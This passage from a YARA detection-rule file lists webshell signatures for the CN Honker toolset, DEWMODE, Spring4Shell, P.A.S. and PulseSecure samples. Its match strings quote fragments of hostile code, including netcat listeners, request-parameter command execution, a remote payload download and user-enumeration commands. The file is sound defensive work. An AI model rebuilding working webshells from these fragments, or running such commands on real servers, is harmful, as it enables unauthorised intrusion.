		$s2 = "strReturn=Replace(strReturn,chr(43),\"%2B\")  'JMDCW" fullword ascii

	condition:
		filesize <7342KB and all of them
}
rule SIGNATURE_BASE_CN_Honker_Webshell_Cmfshell : FILE {
    meta:
		description = "Webshell from CN Honker Pentest Toolset - file cmfshell.cmf"
		author = "Florian Roth (Nextron Systems)"
		id = "c5670deb-952c-5ba4-949a-097cc09bb108"
		date = "2015-06-23"
		modified = "2023-12-05"
		reference = "Disclosed CN Honker Pentest Toolset"
		source_url = "https://github.com/Neo23x0/signature-base/blob/c60c8e3408dce1c9597259b8816f7526df9ac778/yara/cn_pentestset_webshells.yar#L944-L959"
		license_url = "https://github.com/Neo23x0/signature-base/blob/c60c8e3408dce1c9597259b8816f7526df9ac778/LICENSE"
		hash = "b9b2107c946431e4ad1a8f5e53ac05e132935c0e"
		logic_hash = "f138a82c2d6a831626fe200308eb89cb50ffeec2f2722599eb4ccbd082bad73d"
		score = 70
		quality = 85
		tags = "FILE"
		license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"

	strings:
		$s1 = "<cfexecute name=\"C:\\Winnt\\System32\\cmd.exe\"" fullword ascii
		$s2 = "<form action=\"<cfoutput>#CGI.SCRIPT_NAME#</cfoutput>\" method=\"post\">" fullword ascii

	condition:
		filesize <4KB and all of them
}
rule SIGNATURE_BASE_CN_Honker_Webshell_PHP_Php4 : FILE {
    meta:
		description = "Webshell from CN Honker Pentest Toolset - file php4.txt"
		author = "Florian Roth (Nextron Systems)"
		id = "82446dff-dd1e-54a8-bb70-570bedc805b5"
		date = "2015-06-23"
		modified = "2023-12-05"
		reference = "Disclosed CN Honker Pentest Toolset"
		source_url = "https://github.com/Neo23x0/signature-base/blob/c60c8e3408dce1c9597259b8816f7526df9ac778/yara/cn_pentestset_webshells.yar#L961-L975"
		license_url = "https://github.com/Neo23x0/signature-base/blob/c60c8e3408dce1c9597259b8816f7526df9ac778/LICENSE"
		hash = "179975f632baff6ee4d674fe3fabc324724fee9e"
		logic_hash = "e625b6d1fd2c1e62306ccae2775ee7b53ddcdd7a6baef55b386dfcd92dc2e764"
		score = 70
		quality = 85
		tags = "FILE"
		license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"

	strings:
		$s0 = "nc -l -vv -p port(" ascii

	condition:
		uint16(0)==0x4850 and filesize <1KB and all of them
}
rule SIGNATURE_BASE_CN_Honker_Webshell_Linux_2_6_Exploit : FILE {
    meta:
		description = "Webshell from CN Honker Pentest Toolset - file 2.6.9"
		author = "Florian Roth (Nextron Systems)"
		id = "22e2aca7-418f-598f-af0c-99942aaf3278"
		date = "2015-06-23"
		modified = "2023-12-05"
		reference = "Disclosed CN Honker Pentest Toolset"
		source_url = "https://github.com/Neo23x0/signature-base/blob/c60c8e3408dce1c9597259b8816f7526df9ac778/yara/cn_pentestset_webshells.yar#L977-L991"
		license_url = "https://github.com/Neo23x0/signature-base/blob/c60c8e3408dce1c9597259b8816f7526df9ac778/LICENSE"
		hash = "ec22fac0510d0dc2c29d56c55ff7135239b0aeee"
		logic_hash = "7f3e2937796358a949ce980210ddeb1a606a7b9c2b4d9c4a4acad49bb556dfc8"
		score = 70
		quality = 85
		tags = "FILE"
		license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"

	strings:
		$s0 = "[+] Failed to get root :( Something's wrong.  Maybe the kernel isn't vulnerable?" fullword ascii

	condition:
		filesize <56KB and all of them
}
rule SIGNATURE_BASE_CN_Honker_Webshell_ASP_Asp2 : FILE {
    meta:
		description = "Webshell from CN Honker Pentest Toolset - file asp2.txt"
		author = "Florian Roth (Nextron Systems)"
		id = "e5296405-c345-55dc-acd9-be6aca86c60b"
		date = "2015-06-23"
		modified = "2023-12-05"
		reference = "Disclosed CN Honker Pentest Toolset"
		source_url = "https://github.com/Neo23x0/signature-base/blob/c60c8e3408dce1c9597259b8816f7526df9ac778/yara/cn_pentestset_webshells.yar#L993-L1009"
		license_url = "https://github.com/Neo23x0/signature-base/blob/c60c8e3408dce1c9597259b8816f7526df9ac778/LICENSE"
		hash = "b3ac478e72a0457798a3532f6799adeaf4a7fc87"
		logic_hash = "6107afe9895c4e0c865e78bece160246815a0d3c589bfc79f8b369b94481cd89"
		score = 70
		quality = 85
		tags = "FILE"
		license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"

	strings:
		$s1 = "<%=server.mappath(request.servervariables(\"script_name\"))%>" fullword ascii
		$s2 = "webshell</font> <font color=#00FF00>" fullword ascii
		$s3 = "Userpwd = \"admin\"   'User Password" fullword ascii

	condition:
		filesize <10KB and all of them
}
rule SIGNATURE_BASE_CN_Honker_Webshell_FTP_MYSQL_MSSQL_SSH : FILE {
    meta:
		description = "Webshell from CN Honker Pentest Toolset - file FTP MYSQL MSSQL SSH.txt"
		author = "Florian Roth (Nextron Systems)"
		id = "dd619901-6f0e-527e-9926-808176641c09"
		date = "2015-06-23"
		modified = "2023-12-05"
		reference = "Disclosed CN Honker Pentest Toolset"
		source_url = "https://github.com/Neo23x0/signature-base/blob/c60c8e3408dce1c9597259b8816f7526df9ac778/yara/cn_pentestset_webshells.yar#L1011-L1029"
		license_url = "https://github.com/Neo23x0/signature-base/blob/c60c8e3408dce1c9597259b8816f7526df9ac778/LICENSE"
		hash = "fe63b215473584564ef2e08651c77f764999e8ac"
		logic_hash = "a66884c71ce0cce05ba6607bf66dc55bfae5393746328c06f5c9ca98005d0caf"
		score = 70
		quality = 85
		tags = "FILE"
		license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"

	strings:
		$s1 = "$_SESSION['hostlist'] = $hostlist = $_POST['hostlist'];" fullword ascii
		$s2 = "Codz by <a href=\"http://www.sablog.net/blog\">4ngel</a><br />" fullword ascii
		$s3 = "if ($conn_id = @ftp_connect($host, $ftpport)) {" fullword ascii
		$s4 = "$_SESSION['sshport'] = $mssqlport = $_POST['sshport'];" fullword ascii
		$s5 = "<title>ScanPass(FTP/MYSQL/MSSQL/SSH) by 4ngel</title>" fullword ascii

	condition:
		filesize <20KB and 3 of them
}
rule SIGNATURE_BASE_CN_Honker_Webshell_ASP_Shell : FILE {
    meta:
		description = "Webshell from CN Honker Pentest Toolset - file shell.txt"
		author = "Florian Roth (Nextron Systems)"
		id = "fdfc3fc1-9400-533b-978b-1a1fac112e1f"
		date = "2015-06-23"
		modified = "2023-12-05"
		reference = "Disclosed CN Honker Pentest Toolset"
		source_url = "https://github.com/Neo23x0/signature-base/blob/c60c8e3408dce1c9597259b8816f7526df9ac778/yara/cn_pentestset_webshells.yar#L1031-L1047"
		license_url = "https://github.com/Neo23x0/signature-base/blob/c60c8e3408dce1c9597259b8816f7526df9ac778/LICENSE"
		hash = "b7b34215c2293ace70fc06cbb9ce73743e867289"
		logic_hash = "be3961d6568acfaadfa09efda2f914259a59f4e30725c7d434e89f6020e40515"
		score = 70
		quality = 85
		tags = "FILE"
		license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"

	strings:
		$s1 = "xPost.Open \"GET\",\"http://www.i0day.com/1.txt\",False //" fullword ascii
		$s2 = "sGet.SaveToFile Server.MapPath(\"test.asp\"),2 //" fullword ascii
		$s3 = "http://hi.baidu.com/xahacker/fuck.txt" fullword ascii

	condition:
		filesize <1KB and all of them
}
rule SIGNATURE_BASE_CN_Honker_Webshell_PHP_Php7 : FILE {
    meta:
		description = "Webshell from CN Honker Pentest Toolset - file php7.txt"
		author = "Florian Roth (Nextron Systems)"
		id = "f21bb0db-d18a-58c0-a227-5baf5536c57b"
		date = "2015-06-23"
		modified = "2023-12-05"
		reference = "Disclosed CN Honker Pentest Toolset"
		source_url = "https://github.com/Neo23x0/signature-base/blob/c60c8e3408dce1c9597259b8816f7526df9ac778/yara/cn_pentestset_webshells.yar#L1049-L1064"
		license_url = "https://github.com/Neo23x0/signature-base/blob/c60c8e3408dce1c9597259b8816f7526df9ac778/LICENSE"
		hash = "05a3f93dbb6c3705fd5151b6ffb64b53bc555575"
		logic_hash = "70804d914c6f31422632943bf663f997eb747a290a13b27bfcc66bc3129f136d"
		score = 70
		quality = 85
		tags = "FILE"
		license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"

	strings:
		$s0 = "---> '.$ports[$i].'<br>'; ob_flush(); flush(); } } echo '</div>'; return true; }" ascii
		$s1 = "$getfile = isset($_POST['downfile']) ? $_POST['downfile'] : ''; $getaction = iss" ascii

	condition:
		filesize <300KB and all of them
}
rule SIGNATURE_BASE_CN_Honker_Webshell_ASP_Rootkit : FILE {
    meta:
		description = "Webshell from CN Honker Pentest Toolset - file rootkit.txt"
		author = "Florian Roth (Nextron Systems)"
		id = "ab51abca-0790-541c-9f18-1568809ef113"
		date = "2015-06-23"
		modified = "2023-12-05"
		reference = "Disclosed CN Honker Pentest Toolset"
		source_url = "https://github.com/Neo23x0/signature-base/blob/c60c8e3408dce1c9597259b8816f7526df9ac778/yara/cn_pentestset_webshells.yar#L1066-L1081"
		license_url = "https://github.com/Neo23x0/signature-base/blob/c60c8e3408dce1c9597259b8816f7526df9ac778/LICENSE"
		hash = "3bfc1c95782e702cf56184e7d438edcf5802eab3"
		logic_hash = "5569a179f011ece9802676542d5556fe8d2a2b144e26065b9e0c5bd06c970201"
		score = 70
		quality = 85
		tags = "FILE"
		license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"

	strings:
		$s0 = "set ss=zsckm.get(\"Win32_ProcessSta\"&uyy&\"rtup\")" fullword ascii
		$s1 = "If jzgm=\"\"Then jzgm=\"cmd.exe /c net user\"" fullword ascii

	condition:
		filesize <80KB and all of them
}
rule SIGNATURE_BASE_CN_Honker_Webshell_Jspshell : FILE {
    meta:
		description = "Webshell from CN Honker Pentest Toolset - file jspshell.txt"
		author = "Florian Roth (Nextron Systems)"
		id = "ff72f94b-1c0a-5615-b35f-35f69c920292"
		date = "2015-06-23"
		modified = "2023-12-05"
		reference = "Disclosed CN Honker Pentest Toolset"
		source_url = "https://github.com/Neo23x0/signature-base/blob/c60c8e3408dce1c9597259b8816f7526df9ac778/yara/cn_pentestset_webshells.yar#L1083-L1098"
		license_url = "https://github.com/Neo23x0/signature-base/blob/c60c8e3408dce1c9597259b8816f7526df9ac778/LICENSE"
		hash = "d16af622f7688d4e0856a2678c4064d3d120e14b"
		logic_hash = "9b952f941eb87d7a1b4f747f4e0b0b5ee8876190c6f684b811057a2c78044047"
		score = 70
		quality = 85
		tags = "FILE"
		license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"

	strings:
		$s1 = "else if(Z.equals(\"M\")){String[] c={z1.substring(2),z1.substring(0,2),z2};Proce" ascii
		$s2 = "String Z=EC(request.getParameter(Pwd)+\"\",cs);String z1=EC(request.getParameter" ascii

	condition:
		filesize <30KB and all of them
}
rule SIGNATURE_BASE_CN_Honker_Webshell_Serv_U_Serv_U : FILE {
    meta:
		description = "Webshell from CN Honker Pentest Toolset - file serv-u.php"
		author = "Florian Roth (Nextron Systems)"
		id = "dd37b2c3-e06d-5245-97d7-40e5eeadb76f"
		date = "2015-06-23"
		modified = "2023-01-27"
		reference = "Disclosed CN Honker Pentest Toolset"
		source_url = "https://github.com/Neo23x0/signature-base/blob/c60c8e3408dce1c9597259b8816f7526df9ac778/yara/cn_pentestset_webshells.yar#L1100-L1117"
		license_url = "https://github.com/Neo23x0/signature-base/blob/c60c8e3408dce1c9597259b8816f7526df9ac778/LICENSE"
		hash = "1c6415a247c08a63e3359b06575b36017befc0c0"
		logic_hash = "89cfcbaa38c3b0b6c31af634b4588dcc8bc7a5aa3edac955a162173341d03622"
		score = 70
		quality = 85
		tags = "FILE"
		license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"

	strings:
		$s1 = "@readfile(\"c:\\\\winnt\\\\system32\\" ascii
		$s2 = "$sendbuf = \"PASS \".$_POST[\"password\"].\"\\r\\n\";" fullword ascii
		$s3 = "$cmd=\"cmd /c rundll32.exe $path,install $openPort $activeStr\";" fullword ascii

	condition:
		filesize <435KB and all of them
}
rule SIGNATURE_BASE_CN_Honker_Webshell_Webshell : FILE {
    meta:
		description = "Webshell from CN Honker Pentest Toolset - file WebShell.cgi"
		author = "Florian Roth (Nextron Systems)"
		id = "9fe4c8fd-3955-5405-add2-835e6f64e8f2"
		date = "2015-06-23"
		modified = "2023-12-05"
		reference = "Disclosed CN Honker Pentest Toolset"
		source_url = "https://github.com/Neo23x0/signature-base/blob/c60c8e3408dce1c9597259b8816f7526df9ac778/yara/cn_pentestset_webshells.yar#L1119-L1135"
		license_url = "https://github.com/Neo23x0/signature-base/blob/c60c8e3408dce1c9597259b8816f7526df9ac778/LICENSE"
		hash = "7ef773df7a2f221468cc8f7683e1ace6b1e8139a"
		logic_hash = "7d80390a86b1858d2cf4f2be56df7e734aea402de0878adf40ef36721719ca74"
		score = 70
		quality = 85
		tags = "FILE"
		license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"

	strings:
		$s1 = "$login = crypt($WebShell::Configuration::password, $salt);" fullword ascii
		$s2 = "my $error = \"This command is not available in the restricted mode.\\n\";" fullword ascii
		$s3 = "warn \"command: '$command'\\n\";" fullword ascii

	condition:
		filesize <30KB and 2 of them
}
rule SIGNATURE_BASE_CN_Honker_Webshell_Tuoku_Script_Mssql_2 : FILE {
    meta:
		description = "Webshell from CN Honker Pentest Toolset - file mssql.asp"
		author = "Florian Roth (Nextron Systems)"
		id = "3f9706d6-7f6e-5120-945a-d5d928d79507"
		date = "2015-06-23"
		modified = "2023-12-05"
		reference = "Disclosed CN Honker Pentest Toolset"
		source_url = "https://github.com/Neo23x0/signature-base/blob/c60c8e3408dce1c9597259b8816f7526df9ac778/yara/cn_pentestset_webshells.yar#L1137-L1153"
		license_url = "https://github.com/Neo23x0/signature-base/blob/c60c8e3408dce1c9597259b8816f7526df9ac778/LICENSE"
		hash = "ad55512afa109b205e4b1b7968a89df0cf781dc9"
		logic_hash = "1d4b75eeeddda6e92b8ec38679d5e2b9d21abf2d2b467b91a066dcf628725f0a"
		score = 70
		quality = 85
		tags = "FILE"
		license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"

	strings:
		$s1 = "sqlpass=request(\"sqlpass\")" fullword ascii
		$s2 = "set file=fso.createtextfile(server.mappath(request(\"filename\")),8,true)" fullword ascii
		$s3 = "<blockquote> ServerIP:&nbsp;&nbsp;&nbsp;" fullword ascii

	condition:
		filesize <3KB and all of them
}
rule SIGNATURE_BASE_CN_Honker_Webshell_ASP_Asp1 : FILE {
    meta:
		description = "Webshell from CN Honker Pentest Toolset - file asp1.txt"
		author = "Florian Roth (Nextron Systems)"
		id = "bf0b1f1e-cf7b-5afb-8e0a-bcfd70fc8887"
		date = "2015-06-23"
		modified = "2023-12-05"
		reference = "Disclosed CN Honker Pentest Toolset"
		source_url = "https://github.com/Neo23x0/signature-base/blob/c60c8e3408dce1c9597259b8816f7526df9ac778/yara/cn_pentestset_webshells.yar#L1155-L1171"
		license_url = "https://github.com/Neo23x0/signature-base/blob/c60c8e3408dce1c9597259b8816f7526df9ac778/LICENSE"
		hash = "78b5889b363043ed8a60bed939744b4b19503552"
		logic_hash = "3b454b1254d05b2208aee02e966c9c56a338dd3d33a2c6acc2c4df3208314055"
		score = 70
		quality = 85
		tags = "FILE"
		license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"

	strings:
		$s1 = "SItEuRl=" ascii
		$s2 = "<%@ LANGUAGE = VBScript.Encode %><%" fullword ascii
		$s3 = "Server.ScriptTimeout=" ascii

	condition:
		filesize <200KB and all of them
}
rule SIGNATURE_BASE_WEBSHELL_APT_PHP_DEWMODE_UNC2546_Feb21_1 : FILE {
    meta:
		description = "Detects DEWMODE webshells"
		author = "Florian Roth (Nextron Systems)"
		id = "ea883f25-0e9b-5617-b05e-191a4a5c5a52"
		date = "2021-02-22"
		modified = "2023-12-05"
		reference = "https://www.fireeye.com/blog/threat-research/2021/02/accellion-fta-exploited-for-data-theft-and-extortion.html"
		source_url = "https://github.com/Neo23x0/signature-base/blob/c60c8e3408dce1c9597259b8816f7526df9ac778/yara/apt_unc2546_dewmode.yar#L2-L25"
		license_url = "https://github.com/Neo23x0/signature-base/blob/c60c8e3408dce1c9597259b8816f7526df9ac778/LICENSE"
		logic_hash = "86ce185f6350eb7485bce5bd31d91085fed25aa8ce78813e1c3c3dffbaae58ff"
		score = 75
		quality = 60
		tags = "FILE"
		hash1 = "2e0df09fa37eabcae645302d9865913b818ee0993199a6d904728f3093ff48c7"
		hash2 = "5fa2b9546770241da7305356d6427847598288290866837626f621d794692c1b"

	strings:
		$x1 = "<font size=4>Cleanup Shell</font></a>';" ascii fullword
		$x2 = "$(sh /tmp/.scr)"
		$x3 = "@system('sudo /usr/local/bin/admin.pl --mount_cifs=" ascii
		$s1 = "target=\\\"_blank\\\">Download</a></td>\";" ascii
		$s2 = ",PASSWORD 1>/dev/null 2>/dev/null');" ascii
		$s3 = ",base64_decode('" ascii
		$s4 = "include \"remote.inc\";" ascii
		$s5 = "@system('sudo /usr/local" ascii

	condition:
		uint16(0)==0x3f3c and filesize <9KB and (1 of ($x*) or 2 of them ) or 3 of them
}
rule SIGNATURE_BASE_WEBSHELL_JSP_Nov21_1 : FILE {
    meta:
		description = "Detects JSP webshells"
		author = "Florian Roth (Nextron Systems)"
		id = "117eed28-c44e-5983-b4c7-b555fc06d923"
		date = "2021-11-23"
		modified = "2023-12-05"
		reference = "https://www.ic3.gov/Media/News/2021/211117-2.pdf"
		source_url = "https://github.com/Neo23x0/signature-base/blob/c60c8e3408dce1c9597259b8816f7526df9ac778/yara/expl_spring4shell.yar#L2-L17"
		license_url = "https://github.com/Neo23x0/signature-base/blob/c60c8e3408dce1c9597259b8816f7526df9ac778/LICENSE"
		logic_hash = "1dac7706421961c71ba6f8d7a223b80e4b77bf206bfb64ee18c7cc894b062a3c"
		score = 70
		quality = 85
		tags = "FILE"

	strings:
		$x1 = "request.getParameter(\"pwd\")" ascii
		$x2 = "excuteCmd(request.getParameter(" ascii
		$x3 = "getRuntime().exec (request.getParameter(" ascii
		$x4 = "private static final String PW = \"whoami\"" ascii

	condition:
		filesize <400KB and 1 of them
}
rule SIGNATURE_BASE_EXPL_POC_Springcore_0Day_Webshell_Mar22_1 : FILE {
    meta:
		description = "Detects webshell found after SpringCore exploitation attempts POC script"
		author = "Florian Roth (Nextron Systems)"
		id = "e7047c98-3c60-5211-9ad5-2bfdfb35d493"
		date = "2022-03-30"
		modified = "2023-12-05"
		reference = "https://twitter.com/vxunderground/status/1509170582469943303"
		source_url = "https://github.com/Neo23x0/signature-base/blob/c60c8e3408dce1c9597259b8816f7526df9ac778/yara/expl_spring4shell.yar#L36-L50"
		license_url = "https://github.com/Neo23x0/signature-base/blob/c60c8e3408dce1c9597259b8816f7526df9ac778/LICENSE"
		logic_hash = "17282b66899356a6051f0b47a7a3f02265737283d760f2256e03a2b934bb63b8"
		score = 70
		quality = 85
		tags = "FILE"

	strings:
		$x1 = ".getInputStream(); int a = -1; byte[] b = new byte[2048];"
		$x2 = "if(\"j\".equals(request.getParameter(\"pwd\")"
		$x3 = ".getRuntime().exec(request.getParameter(\"cmd\")).getInputStream();"

	condition:
		filesize <200KB and 1 of them
}
rule SIGNATURE_BASE_WEBSHELL_PAS_Webshell : FILE {
    meta:
		description = "Detects P.A.S. PHP webshell - Based on DHS/FBI JAR-16-2029 (Grizzly  Steppe)"
		author = "FR/ANSSI/SDO (modified by Florian Roth)"
		id = "862aab77-936e-524c-8669-4f48730f4ed5"
		date = "2021-02-15"
		modified = "2024-05-25"
		reference = "https://www.cert.ssi.gouv.fr/uploads/CERTFR-2021-CTI-005.pdf"
		source_url = "https://github.com/Neo23x0/signature-base/blob/c60c8e3408dce1c9597259b8816f7526df9ac778/yara/apt_sandworm_centreon.yar#L10-L28"
		license_url = "https://github.com/Neo23x0/signature-base/blob/c60c8e3408dce1c9597259b8816f7526df9ac778/LICENSE"
		logic_hash = "977ee0fdf0e92ccea6b71fea7b2c7aed2965c6966d8af86230ccb0f95b286694"
		score = 70
		quality = 85
		tags = "FILE"

	strings:
		$php = "<?php"
		$strreplace = "(str_replace("
		$md5 = ".substr(md5(strrev($"
		$gzinflate = "gzinflate"
		$cookie = "_COOKIE"
		$isset = "isset"

	condition:
		( filesize >20KB and filesize <200KB) and all of them
}
rule SIGNATURE_BASE_WEBSHELL_PAS_Webshell_Ziparchivefile {
    meta:
		description = "Detects an archive file created by P.A.S. for download operation"
		author = "FR/ANSSI/SDO (modified by Florian Roth)"
		id = "081cc65b-e51c-59fc-a518-cd986e8ee2f7"
		date = "2021-02-15"
		modified = "2024-05-25"
		reference = "https://www.cert.ssi.gouv.fr/uploads/CERTFR-2021-CTI-005.pdf"
		source_url = "https://github.com/Neo23x0/signature-base/blob/c60c8e3408dce1c9597259b8816f7526df9ac778/yara/apt_sandworm_centreon.yar#L30-L42"
		license_url = "https://github.com/Neo23x0/signature-base/blob/c60c8e3408dce1c9597259b8816f7526df9ac778/LICENSE"
		logic_hash = "c15e7022f45ec211ba635d6cd31bab16f4fb0d3038fb19d5765e0f751c14a826"
		score = 80
		quality = 85
		tags = ""

	strings:
		$s1 = "Archive created by P.A.S. v."

	condition:
		$s1
}
rule SIGNATURE_BASE_WEBSHELL_PAS_Webshell_Perlnetworkscript : FILE {
    meta:
		description = "Detects PERL scripts created by P.A.S. webshell"
		author = "FR/ANSSI/SDO"
		id = "1625b63f-ead7-5712-92b4-0ce6ecc49fd4"
		date = "2021-02-15"
		modified = "2024-05-25"
		reference = "https://www.cert.ssi.gouv.fr/uploads/CERTFR-2021-CTI-005.pdf"
		source_url = "https://github.com/Neo23x0/signature-base/blob/c60c8e3408dce1c9597259b8816f7526df9ac778/yara/apt_sandworm_centreon.yar#L44-L62"
		license_url = "https://github.com/Neo23x0/signature-base/blob/c60c8e3408dce1c9597259b8816f7526df9ac778/LICENSE"
		logic_hash = "b170c07a005e737c8069f2cc63f869d4d3ff6593b3bfca5bcaf02d7808da6852"
		score = 90
		quality = 85
		tags = "FILE"

	strings:
		$pl_start = "#!/usr/bin/perl\n$SIG{'CHLD'}='IGNORE'; use IO::Socket; use FileHandle;"
		$pl_status = "$o=\" [OK]\";$e=\" Error: \""
		$pl_socket = "socket(SOCKET, PF_INET, SOCK_STREAM,$tcp) or die print \"$l$e$!$l"
		$msg1 = "print \"$l OK! I\\'m successful connected.$l\""
		$msg2 = "print \"$l OK! I\\'m accept connection.$l\""

	condition:
		filesize <6000 and ($pl_start at 0 and all of ($pl*)) or any of ($msg*)
}
rule SIGNATURE_BASE_WEBSHELL_PAS_Webshell_Sqldumpfile {
    meta:
		description = "Detects SQL dump file created by P.A.S. webshell"
		author = "FR/ANSSI/SDO"
		id = "4c26feeb-3031-5c91-9eeb-4b5fe9702e39"
		date = "2021-02-15"
		modified = "2024-05-25"
		reference = "https://www.cert.ssi.gouv.fr/uploads/CERTFR-2021-CTI-005.pdf"
		source_url = "https://github.com/Neo23x0/signature-base/blob/c60c8e3408dce1c9597259b8816f7526df9ac778/yara/apt_sandworm_centreon.yar#L64-L76"
		license_url = "https://github.com/Neo23x0/signature-base/blob/c60c8e3408dce1c9597259b8816f7526df9ac778/LICENSE"
		logic_hash = "c34abcada22fdf462fd66cc2da18ab9e54215defc6f7a7a95b5a80d1155a2ffe"
		score = 90
		quality = 85
		tags = ""

	strings:
		$ = "-- [ SQL Dump created by P.A.S. ] --"

	condition:
		1 of them
}
rule SIGNATURE_BASE_WEBSHELL_Z_Webshell_2 : FILE {
    meta:
		description = "Detection for the z_webshell"
		author = "DHS NCCIC Hunt and Incident Response Team"
		id = "9a54925f-de10-567f-a1ea-5e7522b47dfd"
		date = "2018-01-25"
		modified = "2023-12-05"
		old_rule_name = "z_webshell"
		reference = "https://github.com/Neo23x0/signature-base"
		source_url = "https://github.com/Neo23x0/signature-base/blob/c60c8e3408dce1c9597259b8816f7526df9ac778/yara/apt_ta18_074A.yar#L9-L24"
		license_url = "https://github.com/Neo23x0/signature-base/blob/c60c8e3408dce1c9597259b8816f7526df9ac778/LICENSE"
		hash = "2c9095c965a55efc46e16b86f9b7d6c6"
		logic_hash = "d41aa107e54af5d45531a46d24b24f9f14635dbcb50ed26f7c787883854f961f"
		score = 75
		quality = 81
		tags = "FILE"

	strings:
		$webshell_name = "public string z_progname =" nocase ascii wide
		$webshell_password = "public string Password =" nocase ascii wide

	condition:
		( uint32(0)==0x2040253c or uint32(0)==0x7073613c) and filesize <100KB and 2 of ($webshell_*)
}
rule SIGNATURE_BASE_FE_Webshell_PL_ATRIUM_1 {
    meta:
		description = "Detects samples mentioned in PulseSecure report"
		author = "Mandiant"
		id = "b2663343-0bae-5215-a443-866ab8626bff"
		date = "2021-04-16"
		modified = "2023-12-05"
		reference = "https://www.fireeye.com/blog/threat-research/2021/04/suspected-apt-actors-leverage-bypass-techniques-pulse-secure-zero-day.html"
		source_url = "https://github.com/Neo23x0/signature-base/blob/c60c8e3408dce1c9597259b8816f7526df9ac778/yara/apt_pulsesecure.yar#L12-L27"
		license_url = "https://github.com/Neo23x0/signature-base/blob/c60c8e3408dce1c9597259b8816f7526df9ac778/LICENSE"
		hash = "ca0175d86049fa7c796ea06b413857a3"
		logic_hash = "869b397616495c644beb997602eac84ddcdbacce4c14755c555f5bda36663ca2"
		score = 75
		quality = 85
		tags = ""

	strings:
		$s1 = "CGI::param("
		$s2 = "system("
		$s3 = /if[\x09\x20]{0,32}\(CGI::param\([\x22\x27]\w{1,64}[\x22\x27]\)\)\s{0,128}\{[\x09\x20]{0,32}print [\x22\x27]Cache-Control: no-cache\\n[\x22\x27][\x09\x20]{0,32};\s{0,128}print [\x22\x27]Content-type: text\/html\\n\\n[\x22\x27][\x09\x20]{0,32};\s{0,128}my \$\w{1,64}[\x09\x20]{0,32}=[\x09\x20]{0,32}CGI::param\([\x22\x27]\w{1,64}[\x22\x27]\)[\x09\x20]{0,32};\s{0,128}system\([\x22\x27]\$/

	condition:
		all of them
}
rule SIGNATURE_BASE_FE_APT_Webshell_PL_HARDPULSE {
    meta:
		description = "Detects samples mentioned in PulseSecure report"
		author = "Mandiant"
		id = "f9a2922e-6b8e-5f92-a947-3215ee8883ac"
		date = "2021-04-16"
		modified = "2023-12-05"
		reference = "https://www.fireeye.com/blog/threat-research/2021/04/suspected-apt-actors-leverage-bypass-techniques-pulse-secure-zero-day.html"
		source_url = "https://github.com/Neo23x0/signature-base/blob/c60c8e3408dce1c9597259b8816f7526df9ac778/yara/apt_pulsesecure.yar#L46-L65"
		license_url = "https://github.com/Neo23x0/signature-base/blob/c60c8e3408dce1c9597259b8816f7526df9ac778/LICENSE"
		hash = "980cba9e82faf194edb6f3cc20dc73ff"
		logic_hash = "37fc40fd998d3294edb05707170bc2deec524fc6451bff212901f9ac3e34bb35"
		score = 75
		quality = 83
		tags = ""

	strings:
		$r1 = /if[\x09\x20]{0,32}\(\$\w{1,64}[\x09\x20]{1,32}eq[\x09\x20]{1,32}[\x22\x27]\w{1,64}[\x22\x27]\)\s{0,128}\{\s{1,128}my[\x09\x20]{1,32}\$\w{1,64}[\x09\x20]{0,32}\x3b\s{1,128}unless[\x09\x20]{0,32}\(open\(\$\w{1,64},[\x09\x20]{0,32}\$\w{1,64}\)\)\s{0,128}\{\s{1,128}goto[\x09\x20]{1,32}\w{1,64}[\x09\x20]{0,32}\x3b\s{1,128}return[\x09\x20]{1,32}0[\x09\x20]{0,32}\x3b\s{0,128}\}/
		$r2 = /open[\x09\x20]{0,32}\(\*\w{1,64}[\x09\x20]{0,32},[\x09\x20]{0,32}[\x22\x27]>/
		$r3 = /if[\x09\x20]{0,32}\(\$\w{1,64}[\x09\x20]{1,32}eq[\x09\x20]{1,32}[\x22\x27]\w{1,64}[\x22\x27]\)\s{0,128}\{\s{1,128}print[\x09\x20]{0,32}[\x22\x27]Content-type/
		$s1 = "CGI::request_method()"
		$s2 = "CGI::param("
		$s3 = "syswrite("
		$s4 = "print $_"

	condition:
		all of them
}
rule SIGNATURE_BASE_FE_APT_Webshell_PL_PULSECHECK_1 {
    meta:
		description = "Detects samples mentioned in PulseSecure report"
		author = "Mandiant"
		id = "f375fdd8-567b-569b-85f4-af54a35d2a93"
		date = "2021-04-16"
		modified = "2023-12-05"
		reference = "https://www.fireeye.com/blog/threat-research/2021/04/suspected-apt-actors-leverage-bypass-techniques-pulse-secure-zero-day.html"
		source_url = "https://github.com/Neo23x0/signature-base/blob/c60c8e3408dce1c9597259b8816f7526df9ac778/yara/apt_pulsesecure.yar#L116-L136"
		license_url = "https://github.com/Neo23x0/signature-base/blob/c60c8e3408dce1c9597259b8816f7526df9ac778/LICENSE"
		hash = "a1dcdf62aafc36dd8cf64774dea80d79fb4e24ba2a82adf4d944d9186acd1cc1"
		logic_hash = "aba457dd33232ef37ca145c5b7cd9c5fe809730339a55c5e90ac46b4a136f6cb"
		score = 75
		quality = 85
		tags = ""

	strings:
		$r1 = /while[\x09\x20]{0,32}\(<\w{1,64}>\)[\x09\x20]{0,32}\{\s{1,256}\$\w{1,64}[\x09\x20]{0,32}\.=[\x09\x20]{0,32}\$_;\s{0,256}\}/
		$s1 = "use Crypt::RC4;"
		$s2 = "use MIME::Base64"
		$s3 = "MIME::Base64::decode("
		$s4 = "popen("
		$s5 = " .= $_;"
		$s6 = "print MIME::Base64::encode(RC4("
		$s7 = "HTTP_X_"

	condition:
